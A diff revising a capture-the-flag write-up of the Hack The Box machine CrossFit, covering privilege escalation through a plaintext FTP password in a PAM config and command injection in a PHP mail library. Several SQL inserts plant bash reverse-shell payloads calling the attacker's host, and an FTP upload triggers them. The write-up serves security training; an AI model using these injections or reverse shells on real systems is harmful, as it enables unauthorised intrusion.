@@ -1124,7 +1124,7 @@ hank@crossfit:~$ cat user.txt
 9e326def2df97f2b7ac41362a8d8f446
 ```
 
-
+After cracking the hash to get the password I fired up SSH and logged in as `hank`.  The first thing I did was collect my hard-earned proof.
 
 ## Path to Power \(Gaining Administrator Access\)
 
@@ -1142,7 +1142,7 @@ hank@crossfit:~$ sudo -l
 -bash: sudo: command not found
 ```
 
-Well this was odd... It told me that it could not find the `sudo` command. I went and checked inside `/usr/sbin` and there was no binary for `sudo` installed.
+Well this was odd... It told me that it could not find the `sudo` command.  I went and checked inside `/usr/sbin` and there was no binary for `sudo` installed.
 
 ```text
 hank@crossfit:~$ ifconfig
@@ -1164,7 +1164,7 @@ hank@crossfit:~$ ip a
        valid_lft forever preferred_lft forever
 ```
 
-The program `ifconfig` was also missing
+The program `ifconfig` was also missing.
 
 ```text
 hank@crossfit:~$ uname -a
@@ -1196,6 +1196,8 @@ I checked for running processes and noticed a few things were running from the `
 
 > Selenium automates browsers. That's it!
 
+TODO: cat /opt/selenium/check\_report.py and talk about this simulating the admin checking the security reports, which allowed me to access the machine.
+
 ```text
 hank@crossfit:/var$ cd www/
 hank@crossfit:/var/www$ ls
@@ -1210,7 +1212,7 @@ drwxr-xr-x  9 root     root   4096 May 12  2020 gym-club
 drwxr-xr-x  2 root     root   4096 May  1  2020 html
 ```
 
-While checking for other folders in the `/var/www` directory I noticed they looked suspiciously familiar...
+While checking for folders in the `/var/www` directory I noticed they looked suspiciously familiar...I also noticed the permissions for the user and group.  The `vsftpd` group was what had allowed me to `PUT` files in the `development-test` folder using FTP.  Interestingly, I could have also done this through a web interface if there had been a site hosted here because it was owned by `www-data`.  This is probably why the folder was empty.
 
 ```sql
 hank@crossfit:/var/www/gym-club$ mysql -u crossfit -p -D crossfit
@@ -1303,7 +1305,7 @@ MariaDB [information_schema]> show tables;
 ---snipped---
 ```
 
-I used the credentials to log into the database, but there was no useful information there. It only held information that was displayed on the website.
+After looking at the folders in `/var/www` I remembered that I had found credentials for logging into MySQL there.  I used the credentials to log into the database, but there was no useful information there. It only held information that was displayed on the website.
 
 ```php
 <?php
@@ -1391,7 +1393,7 @@ hank@crossfit:/home/isaac/send_updates$ find / -group admins 2>/dev/null
 /etc/pam.d/runuser
 ```
 
-I searched for files that `hank` could access as a member of the `admins` group, and found a bunch of them in the /etc/pam.d folder
+I searched for files that `hank` could access as a member of the `admins` group, and found a bunch of them that were in the `/etc/pam.d` directory.  This was quite interesting since PAM deals with user authentication.
 
 ```bash
 auth sufficient pam_mysql.so user=ftpadm passwd=8W)}gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3
@@ -1409,9 +1411,9 @@ auth    required        pam_listfile.so item=user sense=deny file=/etc/ftpusers 
 auth    required        pam_shells.so
 ```
 
-### `ftpadm`
+In `/etc/pam.d` the file `vsftpd` contained the password for the user `ftpadm`.
 
-In `/etc/pam.d` the file `vsftpd` contained the password for `ftpadm`.
+### `ftpadm`
 
 ```bash
 # Set this to 'yes' to enable PAM authentication, account processing,
@@ -1464,7 +1466,7 @@ Subsystem       sftp    /usr/lib/openssh/sftp-server
 DenyUsers ftpadm
 ```
 
-Unfortunately the SSH configuration was set to explicitly deny `ftpadm` from logging in through SSH.  I could also see that it was configured to run the subsystem for SFTP.
+Unfortunately, the SSH configuration was set to explicitly deny `ftpadm` from logging in through SSH.  I could also see that it was configured to run the subsystem for SFTP.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
@@ -1474,7 +1476,7 @@ lftp ftpadm@10.10.10.208:~> ls
 drwxrwx---    2 1003     116          4096 Sep 21 10:19 messages
 ```
 
-I tried instead to log in through FTP once again.  There was only one folder `messages`, which I had read-write access to, but it was empty. Once again I uploaded a reverse shell and tried to execute it, but I wasn't sure where the folder was.
+I tried instead to log in through FTP once again.  This time, there was only one folder `messages`, which I had read-write access to, but was empty.  Once again I uploaded a reverse shell and tried to execute it, but I wasn't sure where the folder was in the filesystem.  I decided to keep this in mind as I continued my enumeration.
 
 ### send\_updates.php
 
@@ -1561,11 +1563,11 @@ In the folder `/home/isaac/send_updates` I found the `send_updates.php` file. Re
 }
 ```
 
-The file `composer.json` showed the version of this library was 1.6.0
+The file `composer.json` showed the version of this library was 1.6.0.  A web search showed that this was vulnerable to command injection.
 
-[https://snyk.io/vuln/SNYK-PHP-MIKEHAERTLPHPSHELLCOMMAND-538426](https://snyk.io/vuln/SNYK-PHP-MIKEHAERTLPHPSHELLCOMMAND-538426)
+* [https://snyk.io/vuln/SNYK-PHP-MIKEHAERTLPHPSHELLCOMMAND-538426](https://snyk.io/vuln/SNYK-PHP-MIKEHAERTLPHPSHELLCOMMAND-538426)
 
-Since this executes arbitrary commands, and there is no kind of filtering being done on the `email` parameter, this could be used to inject other commands.
+Since this library is used to execute arbitrary commands, and there was no kind of filtering being done on the `email` parameter, this could be used to inject other commands.
 
 ```text
 hank@crossfit:/home/isaac/send_updates$ mail --help
@@ -1636,7 +1638,7 @@ GNU Mailutils home page: <http://mailutils.org>
 General help using GNU software: <http://www.gnu.org/gethelp/>
 ```
 
-Looking at the `mail` program's help, I noticed that there was a flag `-E` that allowed to execution of commands. Since I already had the credentials to the database, it seemed likely that I could create an entry in the user's table that contained code I wanted to execute as `isaac` in the email field. `isaac` did not have a .ssh folder to insert my public key to, so I needed to craft a reverse shell
+Looking at the `mail` program's help, I noticed that there was a flag `-E` that allowed to execution of commands. Since I already had the credentials to the database, it seemed likely that I could create an entry in the user's table that contained code I wanted to execute as `isaac` in the email field of the database to be loaded and run within`send_updates.php`. `isaac` did not have a `.ssh` folder to insert my public key to, so I needed to craft a reverse shell instead.  
 
 ```text
 hank@crossfit:/home/isaac$ mysql -u crossfit -p -D crossfit
@@ -1652,13 +1654,6 @@ Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
 
 Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 
-MariaDB [crossfit]> INSERT INTO users (username, email) VALUES (zweilos, -E $(bash -i >& /dev/tcp/10.10.15.98/8099))
-    -> ;
-ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '$(bash -i >& /dev/tcp/10.10.15.98/8099))' at line 1
-MariaDB [crossfit]> INSERT INTO users (username, email) VALUES ("zweilos", "-E $(bash -i >& /dev/tcp/10.10.15.98/8099)");
-ERROR 1054 (42S22): Unknown column 'username' in 'field list'
-MariaDB [crossfit]> select * from users
-users        users.email  users.id     
 MariaDB [crossfit]> select * from users
 users        users.email  users.id     
 MariaDB [crossfit]> INSERT INTO users (id, email) VALUES ("1", "-E $(bash -i >& /dev/tcp/10.10.15.98/8099)");
@@ -1673,7 +1668,7 @@ MariaDB [crossfit]> select * from users;
 1 row in set (0.000 sec)
 ```
 
-ghik
+I logged into MySQL using the same credentials as before, and checked for the field names in the `user` table so I knew how to frame my query to insert my reverse shell into the correct field.  I assumed that the `id` field was set to `AUTO_INCREMENT`, but just in case I set it to the value "1" to ensure my code would be the first entry.  The script from earlier said it pulled only the first entry.  
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
@@ -1686,7 +1681,30 @@ isaac@crossfit:~$ test
 isaac@crossfit:~$ exit
 ```
 
-I got a connection back from my injected code, however it also immediately ran two commands \( I did not type these: `test` and `exit`\) which caused it to disconnect...I could not get the same injected command to work later. I have not idea what is broken here
+I got a connection back from my injected code, however it also immediately ran two commands \( I did not type these: `test` and `exit`\) which caused it to disconnect...I could not get the same injected command to work later. I have not idea what was broken here, or why those commands got run. I have a feeling that another user somehow got tangled up in my reverse shell and send those commands, closing my session.
+
+```bash
+$fs_iterator = new FilesystemIterator($msg_dir);
+
+    foreach ($fs_iterator as $file_info)
+    {
+        if($file_info->isFile())
+```
+
+The code above from `send_updates.php` looks through everything in `$msgdir` and if there was a file, it would run the rest of the code.  
+
+```text
+┌──(zweilos㉿kali)-[~/htb/crossfit]
+└─$ lftp -u ftpadm 10.10.10.208 -e "set ssl:verify-certificate no" 
+Password: 
+lftp ftpadm@10.10.10.208:~> put ~/rev-php.php    
+put: /home/zweilos/rev-php.php: Access failed: 553 Could not create file. (rev-php.php)
+lftp ftpadm@10.10.10.208:/> cd messages/
+lftp ftpadm@10.10.10.208:/messages> put ~/rev-php.php 
+73 bytes transferred
+```
+
+ After some testing I found out that I needed to trigger the message by uploading a file into the `messages` folder after logging in with `ftpadm`.  It did not seem to matter what the file was. 
 
 ```text
 MariaDB [crossfit]> INSERT INTO users (id,email) VALUES (8081,"-E $(bash -c 'bash -i >& /dev/tcp/10.10.14.176/8081 0>&1')");
@@ -1701,41 +1719,28 @@ MariaDB [crossfit]> select * from users;
 1 row in set (0.000 sec)
 ```
 
-This worked
+I changed ports and tried inserting my reverse shell again, and this time got a steady connection. 
 
 ```sql
 MariaDB [crossfit]> INSERT INTO users (email) VALUES ("test & bash -c 'bash -i >& /dev/tcp/10.10.14.176/10001 0>&1'");
 Query OK, 1 row affected (0.001 sec)
 ```
 
-This also worked
+I lost my connection again due to an "unplanned network outage", so had to try again.  I forgot about the `-E` flag when I came back to this and found another way to get my code to execute.  Chaining bash commands using `&` also worked.
+
+### Enumeration as `isaac`
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
-└─$ lftp -u ftpadm 10.10.10.208 -e "set ssl:verify-certificate no" 
-Password: 
-lftp ftpadm@10.10.10.208:~> put ~/rev-php.php    
-put: /home/zweilos/rev-php.php: Access failed: 553 Could not create file. (rev-php.php)
-lftp ftpadm@10.10.10.208:/> cd messages/
-lftp ftpadm@10.10.10.208:/messages> put ~/rev-php.php 
-73 bytes transferred
-```
-
-After a lot of testing, and trying random things I found out that I needed to trigger the message by uploading a file into the `messages` folder after logging in with `ftpadm`.
-
-#### enumeration as `isaac`
-
-```text
-┌──(zweilos㉿kali)-[~/htb/crossfit]
-└─$ nc -lvnp 8081                                                                                   1 ⨯
-listening on [any] 8081 ...
+└─$ nc -lvnp 10001                                                                                   1 ⨯
+listening on [any] 10001 ...
 connect to [10.10.14.176] from (UNKNOWN) [10.10.10.208] 54756
 bash: cannot set terminal process group (2913): Inappropriate ioctl for device
 bash: no job control in this shell
 isaac@crossfit:~$
 ```
 
-Finally got a shell back after triggering it by uploading a file to the ftp server
+I finally got a shell back after triggering it by uploading a file to the ftp server.
 
 ```text
 isaac@crossfit:~$ id
